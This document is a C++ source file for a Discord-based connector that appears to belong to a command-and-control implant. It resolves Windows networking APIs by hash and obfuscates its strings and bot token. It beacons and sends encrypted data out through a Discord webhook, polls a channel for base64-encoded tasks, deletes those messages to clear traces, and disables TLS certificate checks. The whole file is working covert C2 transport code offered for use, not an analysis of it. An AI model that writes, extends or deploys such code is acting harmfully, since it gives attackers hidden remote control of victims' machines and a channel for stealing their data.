#include "ConnectorDiscord.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "Obfuscate.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"
#include "DebugLog.h"


// ============================================================================
// Local helpers (same pattern as ConnectorHTTP.cpp)
// ============================================================================

static DWORD _slen(const CHAR* str)
{
	DWORD i = 0;
	if (str != NULL)
		for (; str[i]; i++);
	return i;
}

static void _scopy(CHAR* dst, const CHAR* src, DWORD len)
{
	for (DWORD i = 0; i < len; i++)
		dst[i] = src[i];
}

static int _sfind(const CHAR* haystack, DWORD haystackLen, const CHAR* needle, DWORD needleLen)
{
	if (needleLen == 0 || needleLen > haystackLen)
		return -1;
	for (DWORD i = 0; i <= haystackLen - needleLen; i++) {
		DWORD j = 0;
		while (j < needleLen && haystack[i + j] == needle[j])
			j++;
		if (j == needleLen)
			return (int)i;
	}
	return -1;
}


// ============================================================================
// operator new / delete
// ============================================================================

void* ConnectorDiscord::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorDiscord::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorDiscord));
}


// ============================================================================
// Constructor
// ============================================================================

ConnectorDiscord::ConnectorDiscord()
{
	this->hSession    = NULL;
	this->recvData    = NULL;
	this->recvSize    = 0;
	this->beatData    = NULL;
	this->beatSize    = 0;
	this->beatSent    = FALSE;
	this->tokenObf    = NULL;
	this->tokenObfLen = 0;

	memset(this->discordHost, 0, sizeof(this->discordHost));
	memset(this->webhookPath, 0, sizeof(this->webhookPath));
	memset(this->tasksPath,   0, sizeof(this->tasksPath));
	memset(this->authHeader,  0, sizeof(this->authHeader));
	memset(this->tokenXorKey, 0, sizeof(this->tokenXorKey));

	this->functions = (DISCORDFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DISCORDFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;

	HMODULE hWininetModule = this->functions->LoadLibraryA(OBF("wininet.dll"));
	DBG("[*] ConnectorDiscord: wininet.dll=0x%p", hWininetModule);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
	}
}


// ============================================================================
// XOR helper — in-place XOR with key
// ============================================================================

void ConnectorDiscord::XorBuffer(BYTE* buf, ULONG len, BYTE* key, ULONG keyLen)
{
	for (ULONG i = 0; i < len; i++)
		buf[i] ^= key[i % keyLen];
}


// ============================================================================
// ParseWebhookUrl — extract host + path from webhook URL
// Input:  "https://discord.com/api/webhooks/xxx/yyy"
// Output: discordHost = "discord.com", webhookPath = "/api/webhooks/xxx/yyy"
// ============================================================================

void ConnectorDiscord::ParseWebhookUrl(const CHAR* url)
{
	// Skip "https://"
	const CHAR* p = url;
	DWORD urlLen = _slen(url);

	// Find "://"
	int schemeEnd = _sfind(p, urlLen, "://", 3);
	if (schemeEnd >= 0)
		p = url + schemeEnd + 3;

	// Find first '/' after host
	const CHAR* slash = p;
	while (*slash && *slash != '/')
		slash++;

	DWORD hostLen = (DWORD)(slash - p);
	if (hostLen >= sizeof(this->discordHost))
		hostLen = sizeof(this->discordHost) - 1;
	_scopy(this->discordHost, p, hostLen);
	this->discordHost[hostLen] = 0;

	// Path is everything from '/' onward
	DWORD pathLen = _slen(slash);
	if (pathLen >= sizeof(this->webhookPath))
		pathLen = sizeof(this->webhookPath) - 1;
	_scopy(this->webhookPath, slash, pathLen);
	this->webhookPath[pathLen] = 0;

	DBG("[*] Discord: parsed host=%s path=%s", this->discordHost, this->webhookPath);
}


// ============================================================================
// DeobfuscateToken — XOR-decrypt bot_token into caller buffer
// ============================================================================

void ConnectorDiscord::DeobfuscateToken(CHAR* out, ULONG outSize)
{
	if (!this->tokenObf || this->tokenObfLen == 0)
		return;

	ULONG copyLen = this->tokenObfLen;
	if (copyLen >= outSize)
		copyLen = outSize - 1;

	memcpy(out, this->tokenObf, copyLen);
	out[copyLen] = 0;
	this->XorBuffer((BYTE*)out, copyLen, this->tokenXorKey, sizeof(this->tokenXorKey));
}


// ============================================================================
// SetConfig — initialize connector, store profile, send initial beat
// ============================================================================

BOOL ConnectorDiscord::SetConfig(ProfileDiscord prof, BYTE* beat, ULONG bSize)
{
	this->profile  = prof;
	this->beatSize = bSize;
	this->beatSent = FALSE;

	// Copy beat data
	if (beat && bSize > 0) {
		this->beatData = (BYTE*) this->functions->LocalAlloc(LPTR, bSize);
		memcpy(this->beatData, beat, bSize);
	}

	// Parse webhook URL
	if (prof.webhook_url)
		this->ParseWebhookUrl((const CHAR*) prof.webhook_url);

	// Build tasks path: "/api/v10/channels/<id>/messages?limit=10"
	if (prof.channel_tasks_id) {
		auto pfx = OBF("/api/v10/channels/");
		auto sfx = OBF("/messages?limit=10");
		DWORD pfxLen = _slen(pfx);
		DWORD idLen  = _slen((CHAR*) prof.channel_tasks_id);
		DWORD sfxLen = _slen(sfx);

		if (pfxLen + idLen + sfxLen < sizeof(this->tasksPath)) {
			DWORD off = 0;
			_scopy(this->tasksPath + off, pfx, pfxLen); off += pfxLen;
			_scopy(this->tasksPath + off, (CHAR*) prof.channel_tasks_id, idLen); off += idLen;
			_scopy(this->tasksPath + off, sfx, sfxLen); off += sfxLen;
			this->tasksPath[off] = 0;
		}
		DBG("[*] Discord: tasksPath=%s", this->tasksPath);
	}

	// XOR-obfuscate bot_token in memory
	if (prof.bot_token) {
		ULONG tokenLen = _slen((CHAR*) prof.bot_token);
		GenerateRandomBytes(this->tokenXorKey, sizeof(this->tokenXorKey));

		this->tokenObf = (BYTE*) this->functions->LocalAlloc(LPTR, tokenLen + 1);
		memcpy(this->tokenObf, prof.bot_token, tokenLen);
		this->tokenObf[tokenLen] = 0;
		this->tokenObfLen = tokenLen;
		this->XorBuffer(this->tokenObf, tokenLen, this->tokenXorKey, sizeof(this->tokenXorKey));

		// Wipe original token from profile memory
		memset(prof.bot_token, 0, tokenLen);
	}

	// Build auth header: "Authorization: Bot <token>\r\n"
	{
		CHAR tokenBuf[200];
		memset(tokenBuf, 0, sizeof(tokenBuf));
		this->DeobfuscateToken(tokenBuf, sizeof(tokenBuf));

		auto authPfx = OBF("Authorization: Bot ");
		DWORD authPfxLen = _slen(authPfx);
		DWORD tokenLen   = _slen(tokenBuf);

		if (authPfxLen + tokenLen + 1 < sizeof(this->authHeader)) {
			DWORD off = 0;
			_scopy(this->authHeader + off, authPfx, authPfxLen); off += authPfxLen;
			_scopy(this->authHeader + off, tokenBuf, tokenLen);  off += tokenLen;
			this->authHeader[off] = 0;
		}

		DBG("[*] Discord: authHeader len=%lu token len=%lu token[0..5]=%c%c%c%c%c%c",
			_slen(this->authHeader), tokenLen,
			tokenBuf[0], tokenBuf[1], tokenBuf[2], tokenBuf[3], tokenBuf[4], tokenBuf[5]);

		// Wipe cleartext token
		memset(tokenBuf, 0, sizeof(tokenBuf));
	}

	// Discord Bot API requires a DiscordBot User-Agent (403 with browser UA)
	auto ua = OBF("DiscordBot (https://discord.com, 1.0)");
	this->hSession = this->functions->InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!this->hSession) {
		DBG("[-] Discord: InternetOpenA FAILED err=%lu", this->functions->GetLastError());
		return FALSE;
	}
	DBG("[+] Discord: hSession=0x%p", this->hSession);

	// Send initial beat via webhook
	if (this->beatData && this->beatSize > 0) {
		LPSTR encBeat = b64_encode(this->beatData, this->beatSize);
		if (encBeat) {
			// Build JSON: {"content":"<base64>"}
			auto jPre = OBF("{\"content\":\"");
			auto jSuf = OBF("\"}");
			DWORD preLen = _slen(jPre);
			DWORD encLen = _slen(encBeat);
			DWORD sufLen = _slen(jSuf);

			ULONG jsonLen = preLen + encLen + sufLen;
			BYTE* jsonBuf = (BYTE*) this->functions->LocalAlloc(LPTR, jsonLen + 1);
			DWORD off = 0;
			_scopy((CHAR*)jsonBuf + off, jPre, preLen); off += preLen;
			_scopy((CHAR*)jsonBuf + off, encBeat, encLen); off += encLen;
			_scopy((CHAR*)jsonBuf + off, jSuf, sufLen); off += sufLen;
			jsonBuf[off] = 0;

			auto ctHeader = OBF("Content-Type: application/json\r\n");

			BYTE* resp = NULL;
			ULONG respLen = 0;
			auto _mPost = OBF("POST");
			BOOL ok = this->HttpsRequest(_mPost, this->webhookPath, ctHeader, jsonBuf, jsonLen, &resp, &respLen);
			DBG("[*] Discord: beat POST %s (%lu bytes json)", ok ? "OK" : "FAIL", jsonLen);

			if (resp) {
				memset(resp, 0, respLen);
				this->functions->LocalFree(resp);
			}
			memset(jsonBuf, 0, jsonLen);
			this->functions->LocalFree(jsonBuf);
			memset(encBeat, 0, encLen);
			this->functions->LocalFree(encBeat);

			this->beatSent = ok;
		}
	}

	return TRUE;
}


// ============================================================================
// HttpsRequest — generic HTTPS request to discord.com
// Returns TRUE on 2xx, allocates outBuf with response body
// ============================================================================

BOOL ConnectorDiscord::HttpsRequest(const CHAR* method, const CHAR* path,
	const CHAR* extraHeaders, BYTE* body, ULONG bodyLen,
	BYTE** outBuf, ULONG* outLen)
{
	if (outBuf)  *outBuf = NULL;
	if (outLen)  *outLen = 0;

	DWORD context = 0;
	BOOL  result  = FALSE;

	HINTERNET hConnect = this->functions->InternetConnectA(
		this->hSession, this->discordHost, INTERNET_DEFAULT_HTTPS_PORT,
		NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);

	if (!hConnect) {
		DBG("[-] Discord: InternetConnectA FAILED err=%lu", this->functions->GetLastError());
		return FALSE;
	}

	CHAR acceptTypes[] = { '*', '/', '*', 0 };
	LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
	DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD
		| INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI
		| INTERNET_FLAG_KEEP_CONNECTION;

	HINTERNET hRequest = this->functions->HttpOpenRequestA(
		hConnect, method, path, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);

	if (!hRequest) {
		DBG("[-] Discord: HttpOpenRequestA FAILED err=%lu", this->functions->GetLastError());
		this->functions->InternetCloseHandle(hConnect);
		return FALSE;
	}

	// Ignore SSL cert errors (self-signed proxies, debugging)
	{
		DWORD dwFlags = 0;
		DWORD dwBuffer = sizeof(DWORD);
		this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION
			| SECURITY_FLAG_IGNORE_WRONG_USAGE;
		this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	// Build headers
	DWORD hdrLen = 0;
	CHAR* hdrBuf = NULL;
	{
		DWORD extraLen = extraHeaders ? _slen(extraHeaders) : 0;
		hdrLen = extraLen;
		hdrBuf = (CHAR*) this->functions->LocalAlloc(LPTR, hdrLen + 1);
		DWORD off = 0;
		if (extraLen) {
			_scopy(hdrBuf + off, extraHeaders, extraLen);
			off += extraLen;
		}
		hdrBuf[off] = 0;
		hdrLen = off;
	}

	BOOL sent = this->functions->HttpSendRequestA(hRequest, hdrBuf, hdrLen, (LPVOID)body, bodyLen);
	DBG("[*] Discord: %s %s -> sent=%d", method, path, sent);

	if (hdrBuf) {
		memset(hdrBuf, 0, hdrLen);
		this->functions->LocalFree(hdrBuf);
	}

	if (sent) {
		// Check status code
		CHAR statusCode[16];
		DWORD statusCodeLen = sizeof(statusCode);
		this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLen, 0);
		DBG("[*] Discord: response status=%s", statusCode);

		int code = 0;
		for (int i = 0; statusCode[i] >= '0' && statusCode[i] <= '9'; i++)
			code = code * 10 + (statusCode[i] - '0');

		// Read response body (chunked or content-length)
		ULONG totalRead = 0;
		ULONG bufCapacity = 0x1000; // start with 4KB
		BYTE* buffer = (BYTE*) this->functions->LocalAlloc(LPTR, bufCapacity);
		DWORD available = 0;

		if (buffer) {
			while (1) {
				BOOL qr = this->functions->InternetQueryDataAvailable(hRequest, &available, 0, 0);
				if (!qr || !available)
					break;

				// Grow buffer if needed
				if (totalRead + available > bufCapacity) {
					bufCapacity = totalRead + available + 0x1000;
					buffer = (BYTE*) this->functions->LocalReAlloc(buffer, bufCapacity, LMEM_MOVEABLE);
					if (!buffer) break;
				}

				DWORD readBytes = 0;
				BOOL rr = this->functions->InternetReadFile(hRequest, buffer + totalRead, available, &readBytes);
				if (!rr || !readBytes)
					break;
				totalRead += readBytes;
			}
		}

		if (totalRead > 0 && outBuf && outLen) {
			*outBuf = buffer;
			*outLen = totalRead;
		} else if (buffer) {
			this->functions->LocalFree(buffer);
		}

		result = (code >= 200 && code < 300);
	}

	this->functions->InternetCloseHandle(hRequest);
	this->functions->InternetCloseHandle(hConnect);

	return result;
}


// ============================================================================
// ExtractJsonString — find "key":"value" and return allocated copy of value
// Handles escaped quotes inside value. Caller must free result.
// ============================================================================

CHAR* ConnectorDiscord::ExtractJsonString(const CHAR* json, ULONG jsonLen, const CHAR* key, ULONG* outLen)
{
	*outLen = 0;

	// Build search pattern: "key":"
	DWORD keyLen = _slen(key);
	// Pattern: "<key>":"
	DWORD patLen = 1 + keyLen + 3; // quote + key + quote + colon + quote
	CHAR pat[64];
	if (patLen >= sizeof(pat))
		return NULL;

	DWORD pi = 0;
	pat[pi++] = '"';
	_scopy(pat + pi, key, keyLen); pi += keyLen;
	pat[pi++] = '"';
	pat[pi++] = ':';
	pat[pi++] = '"';
	pat[pi] = 0;

	int pos = _sfind(json, jsonLen, pat, patLen);
	if (pos < 0) {
		// Try with space after colon: "key": "
		pi = 0;
		pat[pi++] = '"';
		_scopy(pat + pi, key, keyLen); pi += keyLen;
		pat[pi++] = '"';
		pat[pi++] = ':';
		pat[pi++] = ' ';
		pat[pi++] = '"';
		pat[pi] = 0;
		patLen = pi;
		pos = _sfind(json, jsonLen, pat, patLen);
		if (pos < 0)
			return NULL;
	}

	// Value starts after the pattern
	ULONG valStart = pos + patLen;
	ULONG valEnd = valStart;

	// Find closing unescaped quote
	while (valEnd < jsonLen) {
		if (json[valEnd] == '"' && (valEnd == 0 || json[valEnd - 1] != '\\'))
			break;
		valEnd++;
	}

	ULONG valLen = valEnd - valStart;
	if (valLen == 0)
		return NULL;

	CHAR* val = (CHAR*) this->functions->LocalAlloc(LPTR, valLen + 1);
	_scopy(val, json + valStart, valLen);
	val[valLen] = 0;
	*outLen = valLen;

	return val;
}


// ============================================================================
// DeleteMessage — DELETE /api/v10/channels/{id}/messages/{msg_id}
// ============================================================================

void ConnectorDiscord::DeleteMessage(const CHAR* messageId)
{
	if (!messageId || !this->profile.channel_tasks_id)
		return;

	// Build path: /api/v10/channels/<channel_id>/messages/<message_id>
	auto pfx = OBF("/api/v10/channels/");
	auto mid = OBF("/messages/");
	DWORD pfxLen  = _slen(pfx);
	DWORD chanLen = _slen((CHAR*) this->profile.channel_tasks_id);
	DWORD midLen  = _slen(mid);
	DWORD msgLen  = _slen(messageId);

	ULONG pathLen = pfxLen + chanLen + midLen + msgLen;
	CHAR* delPath = (CHAR*) this->functions->LocalAlloc(LPTR, pathLen + 1);
	DWORD off = 0;
	_scopy(delPath + off, pfx, pfxLen);          off += pfxLen;
	_scopy(delPath + off, (CHAR*) this->profile.channel_tasks_id, chanLen); off += chanLen;
	_scopy(delPath + off, mid, midLen);           off += midLen;
	_scopy(delPath + off, messageId, msgLen);     off += msgLen;
	delPath[off] = 0;

	DBG("[*] Discord: DELETE %s", delPath);

	BYTE* resp = NULL;
	ULONG respLen = 0;
	auto _mDelete = OBF("DELETE");
	this->HttpsRequest(_mDelete, delPath, this->authHeader, NULL, 0, &resp, &respLen);

	if (resp) {
		memset(resp, 0, respLen);
		this->functions->LocalFree(resp);
	}
	memset(delPath, 0, pathLen);
	this->functions->LocalFree(delPath);
}


// ============================================================================
// PollTasks — GET tasks channel, parse messages, base64-decode content,
//             concatenate into recvData, optionally delete messages
// ============================================================================

void ConnectorDiscord::PollTasks()
{
	if (!this->tasksPath[0])
		return;

	BYTE* resp = NULL;
	ULONG respLen = 0;

	auto _mGet = OBF("GET");
	BOOL ok = this->HttpsRequest(_mGet, this->tasksPath, this->authHeader, NULL, 0, &resp, &respLen);
	if (!ok) {
		// Log error response body for debugging
		if (resp && respLen > 0) {
			DBG("[-] Discord: PollTasks GET failed, body=%.*s", respLen > 200 ? 200 : (int)respLen, (CHAR*)resp);
			memset(resp, 0, respLen);
			this->functions->LocalFree(resp);
		} else {
			DBG("[-] Discord: PollTasks GET failed or empty");
			if (resp) this->functions->LocalFree(resp);
		}
		return;
	}

	DBG("[*] Discord: PollTasks got %lu bytes", respLen);

	// Discord returns a JSON array: [{"id":"...","content":"..."},...]
	// We iterate finding "content":" and "id":" pairs
	// Messages are newest-first, so we process in reverse order for correct ordering

	// First pass: count messages and collect their content+id
	// Simple approach: find all "content":"..." values and "id":"..." values

	// Collect message IDs for cleanup
	#define MAX_DISCORD_MSGS 10
	CHAR* msgIds[MAX_DISCORD_MSGS];
	CHAR* msgContents[MAX_DISCORD_MSGS];
	ULONG msgContentLens[MAX_DISCORD_MSGS];
	ULONG msgIdLens[MAX_DISCORD_MSGS];
	int   msgCount = 0;

	memset(msgIds, 0, sizeof(msgIds));
	memset(msgContents, 0, sizeof(msgContents));
	memset(msgContentLens, 0, sizeof(msgContentLens));
	memset(msgIdLens, 0, sizeof(msgIdLens));

	// Parse JSON array — find each object delimited by { }
	const CHAR* jsonStr = (const CHAR*) resp;
	ULONG searchPos = 0;

	while (searchPos < respLen && msgCount < MAX_DISCORD_MSGS) {
		// Find next '{'
		ULONG objStart = searchPos;
		while (objStart < respLen && jsonStr[objStart] != '{')
			objStart++;
		if (objStart >= respLen)
			break;

		// Find matching '}' (simple — no nested objects in Discord message content)
		ULONG objEnd = objStart + 1;
		int depth = 1;
		while (objEnd < respLen && depth > 0) {
			if (jsonStr[objEnd] == '{') depth++;
			else if (jsonStr[objEnd] == '}') depth--;
			objEnd++;
		}

		ULONG objLen = objEnd - objStart;

		// Extract "id" and "content" from this object
		ULONG idLen = 0, contentLen = 0;
		CHAR* id      = this->ExtractJsonString(jsonStr + objStart, objLen, "id", &idLen);
		CHAR* content = this->ExtractJsonString(jsonStr + objStart, objLen, "content", &contentLen);

		if (content && contentLen > 0) {
			msgIds[msgCount]         = id;
			msgIdLens[msgCount]      = idLen;
			msgContents[msgCount]    = content;
			msgContentLens[msgCount] = contentLen;
			msgCount++;
		} else {
			if (id)      { memset(id, 0, idLen); this->functions->LocalFree(id); }
			if (content) { memset(content, 0, contentLen); this->functions->LocalFree(content); }
		}

		searchPos = objEnd;
	}

	if (msgCount == 0) {
		DBG("[*] Discord: PollTasks no valid messages found");
		memset(resp, 0, respLen);
		this->functions->LocalFree(resp);
		return;
	}

	DBG("[*] Discord: PollTasks found %d messages", msgCount);

	// Process messages in reverse order (oldest first, Discord returns newest-first)
	// Base64-decode each content and concatenate
	BYTE* accumBuf = NULL;
	ULONG accumLen = 0;

	for (int i = msgCount - 1; i >= 0; i--) {
		if (!msgContents[i] || msgContentLens[i] == 0)
			continue;

		// Validate base64
		int decSize = b64_decoded_size(msgContents[i]);
		if (decSize <= 0)
			continue;

		BYTE* decBuf = (BYTE*) this->functions->LocalAlloc(LPTR, decSize);
		if (!b64_decode(msgContents[i], decBuf, decSize)) {
			this->functions->LocalFree(decBuf);
			continue;
		}

		// Append to accumulator
		if (!accumBuf) {
			accumBuf = decBuf;
			accumLen = decSize;
		} else {
			BYTE* newBuf = (BYTE*) this->functions->LocalAlloc(LPTR, accumLen + decSize);
			memcpy(newBuf, accumBuf, accumLen);
			memcpy(newBuf + accumLen, decBuf, decSize);
			memset(accumBuf, 0, accumLen);
			this->functions->LocalFree(accumBuf);
			memset(decBuf, 0, decSize);
			this->functions->LocalFree(decBuf);
			accumBuf = newBuf;
			accumLen += decSize;
		}
	}

	// Set received data
	if (accumBuf && accumLen > 0) {
		this->recvData = accumBuf;
		this->recvSize = (int) accumLen;
		DBG("[+] Discord: PollTasks decoded %lu bytes from %d messages", accumLen, msgCount);
	}

	// Cleanup: delete messages if configured
	if (this->profile.cleanup) {
		for (int i = 0; i < msgCount; i++) {
			if (msgIds[i] && msgIdLens[i] > 0)
				this->DeleteMessage(msgIds[i]);
		}
	}

	// Free message strings
	for (int i = 0; i < msgCount; i++) {
		if (msgIds[i]) {
			memset(msgIds[i], 0, msgIdLens[i]);
			this->functions->LocalFree(msgIds[i]);
		}
		if (msgContents[i]) {
			memset(msgContents[i], 0, msgContentLens[i]);
			this->functions->LocalFree(msgContents[i]);
		}
	}

	// Free raw response
	memset(resp, 0, respLen);
	this->functions->LocalFree(resp);
}


// ============================================================================
// SendData — POST data to webhook, then poll tasks channel
//
// Flow matches ConnectorHTTP::SendData():
//   1. If data != NULL, base64-encode and POST via webhook
//   2. Poll tasks channel for inbound commands (GET + parse + decode)
// ============================================================================

void ConnectorDiscord::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = NULL;

	// 1. Send outbound data via webhook
	//    Format: base64(beat) + "\n" + base64(body)  [or just base64(beat) if no body]
	//    The listener expects beat in every message for agent identification
	{
		LPSTR encBeat = b64_encode(this->beatData, this->beatSize);
		LPSTR encData = (data && data_size > 0) ? b64_encode(data, data_size) : NULL;

		if (encBeat) {
			DWORD beatLen = _slen(encBeat);
			DWORD bodyLen = encData ? _slen(encData) : 0;

			// Discord message limit is 2000 chars.
			// Each message contains: beat|body_chunk (beat repeated in every message)
			// This way the listener can process each message independently.
			DWORD maxBodyPerMsg = 1900 - beatLen - 1; // reserve space for beat + '|'
			if (maxBodyPerMsg < 100) maxBodyPerMsg = 100;

			auto jPre = OBF("{\"content\":\"");
			auto jSuf = OBF("\"}");
			auto ctHeader = OBF("Content-Type: application/json\r\n");
			DWORD preLen = _slen(jPre);
			DWORD sufLen = _slen(jSuf);

			DWORD bodyOffset = 0;
			BOOL firstChunk = TRUE;

			do {
				// Build message content: beat|body_chunk (or just beat if no body)
				DWORD chunkLen = 0;
				if (bodyLen > 0 && bodyOffset < bodyLen) {
					chunkLen = bodyLen - bodyOffset;
					if (chunkLen > maxBodyPerMsg) chunkLen = maxBodyPerMsg;
				}

				DWORD contentLen = beatLen + (chunkLen > 0 ? 1 + chunkLen : 0);
				LPSTR content = (LPSTR) this->functions->LocalAlloc(LPTR, contentLen + 1);
				DWORD coff = 0;
				_scopy(content + coff, encBeat, beatLen); coff += beatLen;
				if (chunkLen > 0) {
					content[coff++] = '|';
					_scopy(content + coff, encData + bodyOffset, chunkLen); coff += chunkLen;
				}
				content[coff] = 0;

				// Build JSON
				ULONG jsonLen = preLen + contentLen + sufLen;
				BYTE* jsonBuf = (BYTE*) this->functions->LocalAlloc(LPTR, jsonLen + 1);
				DWORD joff = 0;
				_scopy((CHAR*)jsonBuf + joff, jPre, preLen);       joff += preLen;
				_scopy((CHAR*)jsonBuf + joff, content, contentLen); joff += contentLen;
				_scopy((CHAR*)jsonBuf + joff, jSuf, sufLen);       joff += sufLen;
				jsonBuf[joff] = 0;

				BYTE* resp = NULL;
				ULONG respLen = 0;
				auto _mPost2 = OBF("POST");
				BOOL ok = this->HttpsRequest(_mPost2, this->webhookPath, ctHeader, jsonBuf, jsonLen, &resp, &respLen);
				DBG("[*] Discord: POST chunk bodyOff=%lu chunkLen=%lu -> %s", bodyOffset, chunkLen, ok ? "OK" : "FAIL");

				if (resp) { memset(resp, 0, respLen); this->functions->LocalFree(resp); }
				memset(jsonBuf, 0, jsonLen); this->functions->LocalFree(jsonBuf);
				memset(content, 0, contentLen); this->functions->LocalFree(content);

				bodyOffset += chunkLen;

				// Rate limit delay between chunks
				if (bodyOffset < bodyLen) {
					ApiWin->Sleep(500);
				}

				firstChunk = FALSE;
			} while (bodyLen > 0 && bodyOffset < bodyLen);

			memset(encBeat, 0, beatLen); this->functions->LocalFree(encBeat);
			if (encData) { memset(encData, 0, bodyLen); this->functions->LocalFree(encData); }
		}
	}

	// 2. Wait for the listener to process our message and post tasks
	//    The listener polls every poll_interval seconds, so we wait at least that long
	{
		ULONG waitMs = (this->profile.poll_interval + 3) * 1000; // poll + 3s processing margin
		if (waitMs < 4000) waitMs = 4000;
		if (waitMs > 30000) waitMs = 30000;
		DBG("[*] Discord: waiting %lu ms for listener to process...", waitMs);
		ApiWin->Sleep(waitMs);
	}

	// 3. Poll tasks channel for inbound commands
	this->PollTasks();
}


// ============================================================================
// RecvData / RecvSize / RecvClear
// ============================================================================

BYTE* ConnectorDiscord::RecvData()
{
	return this->recvData;
}

int ConnectorDiscord::RecvSize()
{
	return this->recvSize;
}

void ConnectorDiscord::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
	this->recvSize = 0;
}


// ============================================================================
// CloseConnector — cleanup all resources
// ============================================================================

void ConnectorDiscord::CloseConnector()
{
	if (this->hSession) {
		this->functions->InternetCloseHandle(this->hSession);
		this->hSession = NULL;
	}

	if (this->beatData) {
		memset(this->beatData, 0, this->beatSize);
		this->functions->LocalFree(this->beatData);
		this->beatData = NULL;
		this->beatSize = 0;
	}

	if (this->tokenObf) {
		memset(this->tokenObf, 0, this->tokenObfLen);
		this->functions->LocalFree(this->tokenObf);
		this->tokenObf = NULL;
		this->tokenObfLen = 0;
	}

	memset(this->discordHost, 0, sizeof(this->discordHost));
	memset(this->webhookPath, 0, sizeof(this->webhookPath));
	memset(this->tasksPath,   0, sizeof(this->tasksPath));
	memset(this->authHeader,  0, sizeof(this->authHeader));
	memset(this->tokenXorKey, 0, sizeof(this->tokenXorKey));

	if (this->functions) {
		memset(this->functions, 0, sizeof(DISCORDFUNC));
	}
}


// ============================================================================
// Connector interface implementation
// ============================================================================

BOOL ConnectorDiscord::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	ProfileDiscord* prof = (ProfileDiscord*)profilePtr;
	return this->SetConfig(*prof, beat, beatSize);
}

void ConnectorDiscord::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		int encLen;
		unsigned char* encData = EncryptAES256GCM(plainData, plainSize, sessionKey, &encLen);
		this->SendData(encData, encLen);
		MemFreeLocal((LPVOID*)&encData, encLen);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr) {
			int plainLen;
			DecryptAES256GCM(dataPtr, dataSize, sessionKey, &plainLen);
		}
	}
}
